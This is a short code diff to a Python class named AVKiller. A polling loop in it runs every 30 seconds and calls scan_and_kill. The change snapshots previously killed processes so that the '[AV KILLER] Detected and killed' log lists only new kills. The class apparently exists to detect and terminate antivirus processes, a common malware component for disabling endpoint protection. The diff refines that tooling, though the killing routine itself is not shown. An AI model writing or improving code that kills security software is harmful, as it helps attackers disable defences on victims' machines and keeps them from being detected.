@@ -128,11 +128,12 @@ class AVKiller:
             try:
                 time.sleep(30)  # Check every 30 seconds
 
+                previously_killed = set(self.killed_processes)
                 killed = self.scan_and_kill()
 
                 # Only log if we killed something NEW
                 if killed:
-                    new_kills = [p for p in killed if p not in self.killed_processes]
+                    new_kills = [p for p in killed if p not in previously_killed]
                     if new_kills:
                         self.log(f"[AV KILLER] Detected and killed: {', '.join(new_kills)}")
 
